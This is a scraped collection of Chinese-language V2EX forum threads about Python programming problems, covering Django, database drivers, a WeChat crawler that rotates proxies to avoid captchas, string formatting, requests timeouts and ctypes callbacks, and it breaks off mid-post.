Version:\t1.10.3\r", "Exception Type:\tKeyError\r", "Exception Value:\t\r", "'idstr'\r", "Exception Location:\t/usr/lib/python2.7/site-packages/allauth/socialaccount/providers/weibo/provider.py in extract_uid, line 26\r", "Python Executable:\t/usr/bin/python\r", "Python Version:\t2.7.5\r", "Python Path:\t\r", "['/usr/local/app/Quic',\r", " '/usr/bin',\r", " '/usr/lib64/python27.zip',\r", " '/usr/lib64/python2.7',\r", " '/usr/lib64/python2.7/plat-linux2',\r", " '/usr/lib64/python2.7/lib-tk',\r", " '/usr/lib64/python2.7/lib-old',\r", " '/usr/lib64/python2.7/lib-dynload',\r", " '/usr/lib64/python2.7/site-packages',\r", " '/usr/lib/python2.7/site-packages',\r", " '/usr/local/app/Quic']\r", "Server time:\tFri, 2 Dec 2016 17:32:55 +0800", "好多 bug 啊", " \r", "      =  =  这都是在建设中的 bug 已经注明", "   = = 恩...  怎么我觉得这背景是网站最好看的地方了 2333", "    = =  ...  我换成了“登录”...    学习了！", "Nav bar 上还是 “登陆” 🙊🙊", "   ", "  又被发现了", "是免费空间吗？感觉速度不太好。\r", "我以前用 ASP 做过网站，用 windows 的虚拟主机，不知道 django 需要用什么样环境的空间?", "额，楼主留的微信号怎么是个人号？\r", "我还以为有公众号版的呢", "  公众号需要企业认证，没认证的话限制太多，所以没考虑公众号了", "   不是免费的空间 用的香港的 VPS 感觉延迟很低  还不错   我可能要对用户上传的图片优化下，速度确实跟不上", "楼主加油！\r", "想起自己大一暑假也是拿 Django 开发了个给学校的站\r", "\r", "不过后来维护就没什么时间了……感觉版本迭代还是重要点", "   好棒！！我能添加你的 APP 么？", " App?", "东南大学啊", "    =-= 重用一下你的代码", "    恩啊", " 你可以 qq 联系我。。。。。不过那是一年前的代码了。。。", "  django 版本是？", " 1.8 吧好像是。。。。我也记忆不清了。。。。"]},
{"content": ["<div class=\"topic_content\">Exception ignored in: &lt;bound method Cursor.__del__ of &lt;pypyodbc.Cursor object at 0x014621D0&gt;&gt;\r<br>Traceback (most recent call last):\r<br>  File \"D:\\Python34\\lib\\site-packages\\pypyodbc-1.3.3-py3.4.egg\\pypyodbc.py\", line 2366, in __del__\r<br>  File \"D:\\Python34\\lib\\site-packages\\pypyodbc-1.3.3-py3.4.egg\\pypyodbc.py\", line 2348, in close\r<br>AttributeError: 'NoneType' object has no attribute 'SQLFreeStmt'\r<br>Exception ignored in: &lt;bound method Connection.__del__ of &lt;pypyodbc.Connection object at 0x00BB2B30&gt;&gt;\r<br>Traceback (most recent call last):\r<br>  File \"D:\\Python34\\lib\\site-packages\\pypyodbc-1.3.3-py3.4.egg\\pypyodbc.py\", line 2645, in __del__\r<br>  File \"D:\\Python34\\lib\\site-packages\\pypyodbc-1.3.3-py3.4.egg\\pypyodbc.py\", line 2658, in close\r<br>  File \"D:\\Python34\\lib\\site-packages\\pypyodbc-1.3.3-py3.4.egg\\pypyodbc.py\", line 2579, in rollback\r<br>TypeError: 'NoneType' object is not callable\r<br>\r<br>\r<br>我的环境是 XP ＋ Python34 ，之前一直都好好的，这几天总出这个错误，网上搜了半天也没找到解决方法。\r<br>这几天没有添加新的模块，这个错误也是时不时的出现，出现的比例大概占到五分之一吧，运行五次大概有一次出现这错误。</div>"], "reply": "2", "tittle": "Exception ignored in: <bound method Cursor.__del__ of <pypyodbc.Cursor object at 0x014621D0>>这是什么错误？", "comment": ["看了一下 pypy 的源代码，把错误行号标出来。\r", "\r", "    def __del__(self):  \r", "        if not self.closed:\t\t\r", "            self.close()\t#2366 行\r", "\r", "\r", "        if self.connection.connected:\r", "            ret = ODBC_API.SQLFreeStmt(self.stmt_h, SQL_CLOSE)    #2348 行\r", "            check_success(self, ret)\r", "\r", "\r", "    def __del__(self):\r", "        if self.connected:\r", "            self.close()        #2645 行\r", "\r", "\r", "        if self.connected:\r", "            #if DEBUG:print 'disconnect'\r", "            if not self.autocommit:\r", "                self.rollback()      #2658 行\r", "\r", "\r", "    def rollback(self):\r", "        if not self.connected:\r", "            raise ProgrammingError('HY000','Attempt to use a closed connection.') #2579 行\r", "        ret = SQLEndTran(SQL_HANDLE_DBC, self.dbc_h, SQL_ROLLBACK)\r", "        if ret != SQL_SUCCESS:\r", "            check_success(self, ret)", "对了，前几天出了一个小插曲，我是用的 Sublime 编辑运行的，习惯同时打开好几个 py 文件，但是有一天突然出现一个现象，我在用 Ctrl+B 运行的时候，如果其他文件里有错误，会报错，导致没法运行，不过过了那阵子好像就没出过这个现象。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个爬取微信公众号文章的爬虫</p>\n<p>github: <a href=\"https://github.com/bowenpay/wechat-spider\" rel=\"nofollow\">https://github.com/bowenpay/wechat-spider</a></p>\n<h1>微信爬虫的由来</h1>\n<p>我们是一家帮助中国 5000 万贫困人口与社会公益组织的对接的公司。</p>\n<p>我们通过国家和地方政府的“建档立卡”系统，获取到了一手的贫困户数据，目前有 100 万左右，总数为 5000 万，目前每个月都在增长。</p>\n<p>为了帮助这部分贫困户对接公益机构，我写了这个微信爬虫，从微信公众号发布的文章中上找出最新的公益项目。</p>\n<p>这种找项目的方式的可行性，我们还在试验中。</p>\n<p>起初，为了快速上线，本爬虫的代码是基于我的另一个 <a href=\"https://github.com/yijingping/unicrawler\" rel=\"nofollow\">通用爬虫项目</a> 开发的，还不是很完善，所以希望任何对本项目感兴趣的人联系我，与我一同改进这个项目。</p>\n<p>联系方式：在该 issue 下留言告诉我 <a href=\"https://github.com/bowenpay/wechat-spider/issues/1\" rel=\"nofollow\">点击去留言</a></p>\n<h1>界面预览</h1>\n<p>1 ） 要爬取的微信公众号列表</p>\n<p><img alt=\"\" src=\"https://github.com/bowenpay/wechat-spider/blob/master/docs/images/1.jpg?raw=true\"></p>\n<p>2 ） 要爬取的文章关键字列表</p>\n<p><img alt=\"\" src=\"https://github.com/bowenpay/wechat-spider/blob/master/docs/images/2.png?raw=true\"></p>\n<p>3 ） 已经爬取的微信文章</p>\n<p><img alt=\"\" src=\"https://github.com/bowenpay/wechat-spider/blob/master/docs/images/3.png?raw=true\"></p>\n<p>4 ） 查看文章，并标记是否可用</p>\n<p><img alt=\"\" src=\"https://github.com/bowenpay/wechat-spider/blob/master/docs/images/4.jpg?raw=true\"></p>\n<p>5 ） 控制爬取进程数</p>\n<p><img alt=\"\" src=\"https://github.com/bowenpay/wechat-spider/blob/master/docs/images/5.png?raw=true\"></p>\n<h1>使用到的技术和框架</h1>\n<p>django mysql redis lxml selenium</p>\n</div></div>"], "reply": "64", "tittle": "开源公司内部的微信爬虫，寻求志同道合的人一起来改进", "comment": ["咨询下，现在获取微信文章的阅读数，都有哪些方法？", "公司专业做公益，这是一个悖论", "你应该去 py 社区吧。", " v2 就是.... -_-|||", " 公益不允许赚钱机构介入 也是中国公益发展不起来的原因.. 不赚钱的事 始终不长久. 赚钱不等于就不公益了", " ", "\r", "这里面有过去阅读数的方法", " 有其他好的 py 社区吗", "好贴必须顶", "sogo 反爬机制一直更新。。。", "还不太懂 python ，看起来不错， mark 一下", " 多谢 我看看", " 中国公益发展不起来可和这个没关系..\r", "你们公司专门对接需要帮助的贫困户和公益组织.难道是像房屋中介一样收中介费?不然怎么养活公司?", " 用了代理池、 Firefox+selenium ，模拟人工点击，所以一直都挺稳定的。除非搜狗微信的页面样式换了，需要重新更新一下爬取模板。", " 我们有一家公益机构，一家公司。 公益的事情公益做，赚钱的事情公司做。", "不会出现验证码吗？", "用商业的手法做公益，不冲突", "非常支持！\r", "希望以后有机会用到，和提 PR", "幫頂", "  红十字会也是这样想的，所以不被人信任。公司的天职是赚钱，当公众利益与股东利益冲突时候，公司应该坚定选择后者，所以公益的事应该给非盈利组织去做，比如维基百科", " 智商捉急啊，人都说了公司是赚钱的，只不过客户是公益组织而已", " 尽管人无完人，可是如果您在 V 站活动时间足够长，那么一定会有机会读到他的许多言论，您将会发现他的才智还是很不错的。用“智商捉急”来评论他人很不礼貌，还请尊重他人！", " hhh", " 这不是写最小天气预报那 XX 嘛？还会喷别人？", " 这人就是个 sb ，不必理他", " 至少在这个问题上智商显得有点捉急 o(∩_∩)o ，不过还是多谢您的善意提醒！@em70 ，如果有冒犯到 ，向您道歉！", "手动点赞", " @", " Be nice, be kind.", "其实爬 sogou 的都是爬的「订阅号」，真正的「公众号」 比如 招商银行 好像都爬不到。", " 你说的是服务号吧 好像确实没有。 不过服务号定位不一样，侧重于服务，而非宣传。一个月只能发 4 篇文章，量本身也不大。暂时还没有去考虑。", " 会的。所以用了代理池，而且代理服务器的 ip 是 3 分钟切换一次。", " 公益行业是个互联网化程度很低的行业，也是效率较低的行业。 但这也正是我们的机会。 公益和商业是可以共赢的。公司如果考虑长远发展，不只顾眼前的利益，是能获取更大利益的。", "我给你说，爬这种数据都没法直接赚钱。\r", "要爬爬那种数据本身就能兑换价值的，比如 国际机票，国内机票\r", "这种投放到携程去哪平台，可以直接产生价值", "看起来不错，感谢分享", " 也有一些人找过我，要爬这种类型的数据、以及做数据分析和广告投放的。 但是公司的主业是做“中国 5000 万贫困人口与社会公益组织的对接”，所以就没有去做你说的“据本身就能兑换价值”的事情。\r", "我一个人也有些忙不经过来。\r", "不过这个爬虫是可以爬任意数据的，如果你感兴趣，可以做一些尝试。 我可以帮你搭建下基础环境。", " 怎么加入？", " 在 github issue 下留言告诉我  ", " ，这两天我把要做的事情，都列出来。 合作方式也写在上面。", "mark", "  去哪携程的什么平台啊。。会抓取却不知道如何利用价值", "要不是最近比较忙，我就来参加了。。。上班狗闲暇时间很少。。，经常加班。", " \r", "\r", "国外的 ngo 还真是这么做的， ngo 可以在捐款中抽取 ngo 运营费用，其中包括运营人员的基本工资。但是所有的开销啥的都必须是透明的，被监督的。\r", "\r", "虽然做公益是靠理想，但是光靠理想会饿死的。然而广大圣母婊往往都喜欢脱离现实，不管不顾他人死活，只为了抒发原始情绪，感动自己。", "老朋友手工点赞", "先 mark", " 目前的钱都是我们自己垫的，有在接触投资结构。", " 🤗", " 国内也有一些都是公开的，每年年报里面都有详细说明。  基金会中心网 ", " 有一个透明指数，可以看出行业内的透明水平。", "搜狗平台的验证码很难搞，最好有失败和重试机制，以及能不能爬历史文章", "支持公益。", "  我也想问楼主验证码是怎么解决的。。", "支持。\r", "\r", "验证码可以找打码平台解决。", " 我实际上是没有解决。 通过足够多的代理 ip 和失败重试机制，绕过这个限制。", "这个必需 mark", "试一下抓新榜和传送门？", " 传送门和新榜的文章不全。", "马克一下", " 具体办法是怎么操作的？", " 爬取的时候，如果遇到验证码，则放弃本次爬取任务，并记录重试次数，然后将任务重新放到爬取队列。 下次爬取的时候，会随机选择一个代理 ip 爬取。 如此重复，直到不出现验证码，或者达到重试次数限制。", " 代理 ip  是网络还是购买的？", " 1 淘宝上搜动态 vps ，有很多卖的。（便宜、方便） 2  自己找机房，拨号上网的那种，（今日头条用的是这种方式，稳定，快，可控）  \r", "\r", "我用的是这家的： ", " linux 下和 windows 下都需要准备 3 个软件：\r", "1 定时自动重新拨号软件（如拨号精灵）\r", "2 实时获取 ip 并提交到服务端（在项目目录下有， bin/getNewIp.py ）\r", "3 代理软件（如 cproxy ）", " Hi ，你还在做吗，你怎么知道 “今日头条用的是这种方式，稳定，快，可控”", " vps 的 ip 变了，那你怎么连过去呢？还是把程序放在动态 ip vps 上跑", " 需要在 vps 上部署一个脚本，实时获取 ip ，提交到服务端。 \r", " 你说的把程序放在动态 ip vps 上跑也是可以的。", " 早期的今日头条就是这样的。 因为我维护过。", " 哈哈，原来是前辈"]},
{"content": ["<div class=\"topic_content\">from urllib.request import urlopen\r<br>html=urlopen(\"https://www.google.com\")\r<br>print(html)\r<br>输出的代码：\r<br>&lt;http.client.HTTPResponse object at 0x02077970&gt;\r<br>\r<br>\r<br>-----------------------------------------------------------------\r<br>问题已解决\r<br><a target=\"_blank\" href=\"http://stackoverflow.com/questions/32169421/how-do-i-overcome-python-http-client-httpresponse-objects\" rel=\"nofollow\">http://stackoverflow.com/questions/32169421/how-do-i-overcome-python-http-client-httpresponse-objects</a>\r<br>\r<br>x = urlopen(url_getallfolders)\r<br>data = x.read()\r<br>print(x)</div>"], "reply": "1", "tittle": "[已解决]使用 Python 中的 urllib 中的 request 中的 urlopen 输出<http.client.HTTPResponse object at 内存地址>", "comment": ["难道不是 print(data)?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>s = ['0.3','1.25','12.98','2']</p>\n<pre><code>s=map(lambda x:format(float(x),'&gt;5.2f'),s)\n\nprint(list(s))\n</code></pre>\n<p>#['  0.30', ' 1.25', '12.98', '  2.00']</p>\n<h1>转化后还是字符串，格式类似&gt;5.2f，后面不足的补0，前面不足的补空格</h1>\n</div></div>"], "reply": "7", "tittle": "格式化字符串疑问", "comment": ["有没有什么格式可以一步到位的？", "看我大 ruby 一句话搞掂：\r", "```ruby\r", "irb(main):007:0> ['0.3','1.25','12.98','2'].map {|x| '% 2.2f' % x.to_f}\r", "=> [\" 0.30\", \" 1.25\", \" 12.98\", \" 2.00\"]\r", "```", "搞错。。。啊，不能删 /改回复？ - -!", " 什么叫一步到位", "print(['%5.2f'%float(x) for x in ['0.3','1.25','12.98','2']])\r", "一行到位", "直接用格式化的相关函数如 format(),zfill()等", "[ '{: >5.2f}'.format(float(x)) for x in s ]   这个应该可以"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>pth='D:\\mytemp\\lunwenfcache\\convert\\20160907' #该路径明明存在<br>\nprint os.path.isdir(pth) #=&gt;False #但这里却提示该路径不存在?<br>\n后来,发现实际上 pth 字符串当中,'\\201'实际上被转义了,所以第二句代码就返回 False.<br>\n如果这样定义 pth 就不会出错:<br>\npth=r'D:\\mytemp\\lunwenfcache\\convert\\20160907'<br>\n或者这样定义也不会出错:<br>\npth='D:\\mytemp\\lunwenfcache\\convert\\20160907'<br>\n然而,在使用 python 的过程中,类似这样的字符串被悄悄转义的情况,表面上看起来似乎难以发觉.<br>\n不知高手有什么好的经验?\n多谢您的回复!</p>\n</div></div>"], "reply": "17", "tittle": "各位高手请看看怎么规避 Python2 中诡异的字符转义?", "comment": ["字符串里用反斜杠就会被转义，如果完全不想被转义就用三个引号。另外可以用 os.path.join 函数来构造地址", "我只知道 py3 写成这样 D:/mytemp/lunwenfcache/convert/20160907 也行\r", "不确定的最好用三引号", "路径请用 / 无论 windows 还是 linux/macos 都支持", "可以加上个 r 、含义是： raw ，原始字符串，例如： pth= r'D:\\mytemp\\lunwenfcache\\convert\\20160907' \r", "正如楼上所说，路径要用正斜线， windows 也是支持的， windows 当初在 dos 时代用反斜线就是一大败笔。。。", "还可以考虑使用平台无关的 pathsep `os.path.sep`", "这是你不会编程的原因，这个锅 Python2 不背。", "Python2 普通字符串加 r 我是养成习惯的～", " 可以加上个 r 、含义是： raw ，原始字符串，例如： pth= r'D:\\mytemp\\lunwenfcache\\convert\\20160907' \r", "\r", "如果 D:\\mytemp\\lunwenfcache\\convert\\20160907 是自动获取的怎么加 r ？", "os.path.join 在写路径的时候确实可以规避很多问题", "除了楼上各位的建议外，请用一款合适的 IDE ，这类低级错误都会给你提示的", " 源是错的，没法加，", "我是这么写的，纯粹瞎搞：\"D:\\\\mytemp\\\\lunwenfcache\\\\convert\\\\20160907\"", "不要为了偷懒而不写 os.path.join()", " 三引号包裹的字符串,如果包含\\,也是会被转义的: \r", "pth='D:\\mytemp\\lunwenfcache\\convert\\20160907' \r", "pth_3='''D:\\mytemp\\lunwenfcache\\convert\\20160907''' \r", "print pth==pth_3  #=>True \r", "print os.path.isdir(pth_3) \t#=>False", "  同意， pth 的缩写也是醉人", " 你拿不到你说的形式，要么就是被转义了，要么就是对的。", " 只有字面量才被转义，为了能在源码里写进不可打印字符\r", "内存里的数据没有转义，就是数据而已嘛"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不考虑 nginx,Django 如何从程序中识别爬虫或搜索引擎,现在是</p>\n<pre><code>user_agent = request.META.get('HTTP_USER_AGENT')\nspider  = ['bot','Bot','spider','Spider']\nfor s in spider:\n     if s in user_agent:\n           return 'spider'\n</code></pre>\n<p>不知道有没有更高效的方法?</p>\n</div></div>"], "reply": "13", "tittle": "Django 如何从程序中识别爬虫?", "comment": ["如果只是说 ua 的话，用正则会好一点点", "放个隐藏的 URL 爬到了就是 爬不到就是人", " good idea? 这个方法有什么缺点么？在反爬技术中常用么？", "看过一个方法，网页上创建一个空的 css 文件，然后加载了这个 css 的就是正常的浏览器，没有加载的就是爬虫，然后封 IP~", "楼上几位的思路可以的，厉害", " 算是比较叫常用的招数。\r", "如果主页给个 token ，访问其他页面要带着 token 。\r", "给访问次数和频率加以限制。\r", "内容藏加载的 JS 里面，当然这主要是为了解决跨域，但是对爬虫也有点效果。\r", "ajax 需要带制定的随机参数，这个参数的生成可以由 cookie 里的字段和其他东西+js 来生成。\r", "防止别人爬是防不了的，你要防的是别人大规模的爬你的数据。", "用 platformJS 或者 selenium 的爬虫怎么破", " 你要相信，用 phatomjs 和 selenium 的爬虫，规模跟并发是无法于纯 python 比的。", "用 js 操作 cookie 和 token ，欺负欺负纯 python 的静态页面爬虫。", " 然而并不知道具体怎么走。 只是看到过一篇关于反爬虫的文", " 嗯,现在已改成正则", "我只想简单的判断一下爬虫与非爬虫，但 get 到很多技能,Thank you", " 机智"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想用 python 连接 SQL Server ，还要要用连接池。\n直接用 pymssql 是正常的，但是用 DBUtils 和 sqlalchemy 连的时候都提示：</p>\n<p>pymssql.OperationalError) (18456, \"用户 'sa' 登录失败。 DB-Lib error message 200\n18, severity 14:\nGeneral SQL Server error: Check messages from the SQL Server\nDB-Lib error message 20002, severity 9:\nAdaptive Server connection failed (127.0.0.1:1433)\n\")</p>\n<p>用的配置都是一样的：</p>\n<pre><code>conn = pymssql.connect(host=\"127.0.0.1\", port=1433, user=\"sa\", password=\"1234\", database=\"DBtest\", charset=\"utf8\")\nengine = create_engine('mssql+pymssql://sa:1234@127.0.0.1:1433/DBtest/charset=\"utf8')\n</code></pre>\n<p>查到的一些解决方案都是要设置 TDSVER 环境变量，但是我改了也没有用。 Python2 和 Python3 试了都不可以。</p>\n</div></div>"], "reply": "3", "tittle": "求助， Python 通过 数据库连接池 连接 SQL Server", "comment": ["改为 host=\"127.0.0.1:1433\"试试，去掉 port 。", "  ", "   第一行是 pymssql 的配置，这个是可以用的。\r", "已经解决了，问题在最后的 charset 写错了，应该是`DBtest?chartset=utf8`  ", "   不知道怎么就写成这样了。", "问下使用 pymssql 如何插入超过 8000 的图像文件。\r", "有个需求需要数据库直接写入，不能保存路径。"]},
{"content": ["<div class=\"topic_content\">试用 FLASK-ADMIN 建立的 create 和 edit 页面，但是想做一些自定义，比如说每个 control-group 添加一个自定义的 CSS 。\r<br>\r<br>自定义的 ModelView,可以为每个变量添加单独的 CSS, classname 吗？\r<br>\r<br>在编辑或者创建页面，把数据库的名字改成中文的显示，是怎么操作哈？</div>", "<div class=\"topic_content\">完全菜鸟一枚，感谢各位先。我在想是不是在 models 里面 db.StringField(required = True)，这个位置有没有一个给定义的参数取个别名的方法呢？  \r<br>\r<br>或者是在 form_args ？</div>", "<div class=\"topic_content\">自己解决了。 originid=dict(label=u'公众号原始 ID')\r<br>\r<br>用 label 可以操作</div>"], "reply": "11", "tittle": "求高人指点， python flask admin", "comment": ["自己定义 view ，官方文档好像有说，具体我忘了，已经一年没写过 flask 了", "\r", "\r", "\r", "文档里面都有吧", "flask-admin 很难用，与其在他基础之上大量修改，这时间完全可以自己写了。 \r", "\r", "flask-admin 个人认为他为了匹配 Model ，做了很多无谓的功夫。 而且在某些地方做得也不是好。\r", "\r", "比如用 Mongoengine 的时候，只要是 db.ReferenceField 里面的内容都做的跟渣一样。 改起来特别不舒服。", "同 @", " 不建议用 flask-admin ，小项目自己写更方便，大项目就更不会去用了，不灵活。", " 感谢，给我的感觉确实如此，为了匹配它，我已经折腾了更多的东西了。。", " 参考了 form_widget_args ， form_overrides ， form_args ， form_edit_rules 。但是还是没能实现我想要的，改成中文显示和为每个 control-group 添加 CLASS", "flask-admin 和 flask-security 是我用过的最不 Pythonic 的两个插件", "添加 class 可以这样写：\r", "{{ form.username(placeholder=\"Username\", class_=\"form-control\") }}", "上面是写在 template 里，添加 CSS 。\r", "添加属性可以这样写（这个在 form 里写）：\r", "content = TextAreaField(u'Content', render_kw={\"id\": \"content\"})\r", "添加一个值为 content 的 id 。", "\r", "这文章里面是通过 column_labels 和  form_columns 实现了的。为什么我按照下面的设置还没不行呢？求教\r", "\r", "![QQ 截图 20161205145726.png]( ", ")", "flask-admin 的 ui 确实 low ，不过个人项目将就能用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>数据表结构（student_id / class_id / room_id 三个字段全是多对多关系，三个字段组成联合 primary key）如下：</p>\n<p>student_id -  class_id  -  room_id<br>\nstudent1  ---   english  ---   1<br>\nstudent1   ---  english  ---   2<br>\nstudent1   ---  math    ---   3<br>\nstudent2   ---  math   ---    3<br>\nstudent2   ---  Chinese ---    2<br>\nstudent3   ---  math      --- 3<br>\nstudent4   ---  english   ---  1<br>\nstudent4  ---   english   ---  3<br>\nstudent5  ---   english   ---  1<br>\nstudent5  ---   english   ---  2<br>\nstudent5  ---   english   ---  6<br>\nstudent5  ---   math     ---  3</p>\n<p>1 、求同时在上 english 和 math 课的学员名单；</p>\n<p>2 、拓展一下：学员人数再增加，课程科目再增加，教室数量再增加。求给定同时在上某几个科目的学员名单，要怎么查询呢？比如：求同时在上 english 、 math 、 history 三个科目的学员名单？求同时在上 N 个科目的学员名单？</p>\n<p>SQL 可以用 InterSect 来查询不同表的交集，但是同一个表的交集、且如果是查询 N 个科目，就是说别名的表的数量也是不确定的，要怎么查呢？</p>\n<p>用 SQLAlchemy 来处理，也会遇到同样的问题，用 inner join 来查询，遇到 N 个科目（就是要别名 N 次？）该怎么查询呢？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "SQLAlchemy 在同一个表中，求交集，该怎么查询呢？", "comment": []},
{"content": ["<div class=\"topic_content\">仔细看了下 requests 的官方文档,其中特别注明\r<br>\r<br>\"timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）\"\r<br>\r<br>现在遇到一个网站,响应时间非常快,但是\"响应体的下载\"非常慢,估计是防封策略故意设置的,这样我该如何应对呢?求老司机.</div>"], "reply": "9", "tittle": "关于 requests 的 timeout 的疑问", "comment": ["比如你抓取某台国内机器的资源，因为是在国内，所以建立连接很快，但它带宽只有 1M ，所以下载响应体很慢。", "request 支持 stream 的方式，自己分片读，然后判断是否超时", " 现在就是响应体下载很慢,想设置一个超时,应该怎么做呢?", "  如果我想设置一个针对响应体的超时怎么办呢?", " \r", "\r", "\r", "\r", "started_time = time.time()\r", "timeout = 60\r", "\r", "r = requests.get('http://httpbin.org/stream/20', stream=True)\r", "\r", "if r.encoding is None:\r", "    r.encoding = 'utf-8'\r", "\r", "for line in r.iter_lines(decode_unicode=True):\r", "    if time.time() - started_time > 60:\r", "        print \"timeout\"\r", "        break\r", "    if line:\r", "        print json.loads(line)", " 感谢~~~,难为了我一下午的问题貌似有着落了,ORZ", "timeout 可以设置 tuple 的， ", " \r", "\r", "看文档啊，少年。", " 这个路子好野。 60 是拍脑袋出来的? 万一 10s 服务端就把连接关了呢。", " 这个只是举个例子可以这样玩\r", "\r", "要是服务器端关闭了，这个迭代器应该是会抛出异常的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>无法通过 Python 回调函数给 C 程序参数赋值，请帮忙看下 谢谢</p>\n<p></p>\n<p>Python 给 C 程序提供了一个回调函数，以返回 IMSI</p>\n<p>global cbGetIMSI</p>\n<p>CB_GET_IMSI  = CFUNCTYPE(None, c_char_p)</p>\n<p>cbGetIMSI   = CB_GET_IMSI(py_getIMSI)</p>\n<p></p>\n<p>def py_getIMSI(imsi):</p>\n<p>global tc</p>\n<p>tc  = <strong>import</strong>(mod)</p>\n<p>imsi = tc.getIMSI()</p>\n<p>print '####### imsi = ' + imsi</p>\n<p></p>\n<p>#通过 C 程序提供的借口注册回调函数</p>\n<p>lib_inf = cdll.LoadLibrary(self.libinf.get())</p>\n<p>lib_inf.inf_regCbGetImsi(cbGetIMSI)</p>\n<p></p>\n<p>#C 程序注册回调</p>\n<p></p>\n<p>typedef void (*inf_PyCbGetImsi)(char *);</p>\n<p></p>\n<p>int inf_regCbGetImsi(inf_PyCbGetImsi cbFn)</p>\n<p>{</p>\n<p>DBG(\"enter [%s()]\", <strong>FUNCTION</strong>);</p>\n<p></p>\n<p>if (!cbFn)</p>\n<p>{</p>\n<p>return -1;</p>\n<p>}</p>\n<p></p>\n<p>g_pyCB.getImsi = cbFn;</p>\n<p></p>\n<p>return 0;</p>\n<p>}</p>\n<p></p>\n<p>#C 程序调用 Py 回调</p>\n<p>unsigned char aIMSI[15];</p>\n<p>memset(aIMSI, 0, sizeof(aIMSI));</p>\n<p>if (g_pyCB.getImsi)</p>\n<p>{</p>\n<p>g_pyCB.getImsi(aIMSI);</p>\n<p>}</p>\n<p>DBG(\"[%s()] aIMSI = [%s]\", <strong>FUNCTION</strong>, aIMSI);</p>\n<p></p>\n<p></p>\n<p>运行结果</p>\n<p>####### imsi = 001010123456789</p>\n<p>[gnss_lcsGetIMSI()] aIMSI = []</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "无法通过 Python 会跳函数给 C 程序传入参数赋值", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>python 代码如下</p>\n<pre><code>import ctypes\nimport time\n\ndll = ctypes.cdll.LoadLibrary('thinkgear')#cdll different windll\ndllVersion = dll.TG_GetDriverVersion();\nprint(dllVersion)\nconnectionId = dll.TG_GetNewConnectionId();\nprint(connectionId)\nerrCode = dll.TG_SetStreamLog(connectionId, \"streamLog2.txt\" );\n#print(errCode)\nerrCode = dll.TG_SetDataLog(connectionId,\"dataLog2.txt\" );\n\ncomPortName = ctypes.c_char_p()\ncomPortName = \"\\\\\\\\.\\\\COM5\";\nerrCode = dll.TG_Connect(connectionId,comPortName,9600,0);\nprint errCode,'connection susser'\n\npackersRead = 0\n\nwhile 1:\n    errCode = dll.TG_ReadPackets(connectionId,1)\n    if errCode ==1 and dll.TG_GetValueStatus(connectionId,2)!=0:\n        print dll.TG_GetValue(connectionId, 5),dll.TG_GetValue(connectionId, 6),dll.TG_GetValue(connectionId, 9)\n        packersRead = packersRead + 1\n        if packersRead&gt;50:\n            break\n\n        \ndll.TG_Disconnect(connectionId)\ndll.TG_FreeConnection(connectionId)\n</code></pre>\n<p>C 代码如下</p>\n<pre><code>#include &lt;Windows.h&gt;  \n#include &lt;stdio.h&gt;  \n#include \"thinkgear.h\"  \n  \nvoid wait()   \n{  \n    system(\"pause\");  \n}  \n  \nint main()  \n{  \n    char *comPortName = NULL;  \n    int   dllVersion = 0;  // 动态库版本  \n    int   connectionId = 0;  // 连接 ID  \n    int   packetsRead = 0;  // 包数量  \n    int   errCode = 0;      // 错误码  \n  \n    /* 获取动态库版本 */  \n    dllVersion = TG_GetDriverVersion();  \n    printf( \"ThinkGear DLL version: %d\\n\", dllVersion );  \n  \n    /* 获取连接 ID */  \n    connectionId = TG_GetNewConnectionId();  \n    if( connectionId &lt; 0 )   \n    {  \n        printf(\"ERROR: TG_GetNewConnectionId() returned %d.\\n\",   \n            connectionId );  \n        wait();  \n        exit( EXIT_FAILURE );  \n    }  \n  \n    /* 原始数据日志 */  \n    errCode = TG_SetStreamLog( connectionId, \"streamLog.txt\" );  \n    if( errCode &lt; 0 ) {  \n        printf(\"ERROR: TG_SetStreamLog() returned %d.\\n\", errCode );  \n        wait();  \n        exit( EXIT_FAILURE );  \n    }  \n  \n    /* ThinkGear 数据日志 */  \n    errCode = TG_SetDataLog( connectionId, \"dataLog.txt\" );  \n    if( errCode &lt; 0 ) {  \n        printf(\"ERROR: TG_SetDataLog() returned %d.\\n\", errCode );  \n        wait();  \n        exit( EXIT_FAILURE );  \n    }  \n  \n    /* 准备连接的 COM 口 */  \n    comPortName = \"\\\\\\\\.\\\\COM5\"; // \\\\.\\COM3  \n    errCode = TG_Connect( connectionId,   \n        comPortName,   \n        TG_BAUD_9600,   \n        TG_STREAM_PACKETS );  \n    if( errCode &lt; 0 ) {  \n        printf(\"ERROR: TG_Connect() returned %d.\\n\", errCode );  \n        wait();  \n        exit( EXIT_FAILURE );  \n    }  \n    \n    /* 不停的读取数据 */  \n    packetsRead = 0;  \n    while(1/* packetsRead &lt; 10*/ )   \n    {  \n        //Sleep(50);  \n        /* 读一个报文 */  \n        errCode = TG_ReadPackets( connectionId, 1 );  \n  \n        /* 如果这个报文读取成功 */  \n        if( errCode == 1 )  \n        {  \n\t    int detla,theta,beta1;  \n            if(( errCode = TG_GetValueStatus(connectionId, TG_DATA_ATTENTION)) != 0 )   \n            {  \n\t      \tdetla = TG_GetValue(connectionId, TG_DATA_DELTA); \n\t\ttheta = TG_GetValue(connectionId, TG_DATA_THETA); \n\t\tbeta1 = TG_GetValue(connectionId, TG_DATA_BETA1); \n                printf(\"delta = %d, theta=%d, beta1=%d\\n\", detla, theta, beta1);  \n            }  \n        }   \n        else  \n        {  \n            printf(\"ReadPackets:errcode=%d\\n\", errCode);  \n            Sleep(1000);  \n        }  \n  \n    }   \n  \n    /* 释放连接 */  \n    TG_FreeConnection( connectionId );  \n  \n    /* End program */  \n    system(\"pause\");  \n    return( EXIT_SUCCESS );  \n}  \n\n</code></pre>\n<p>C 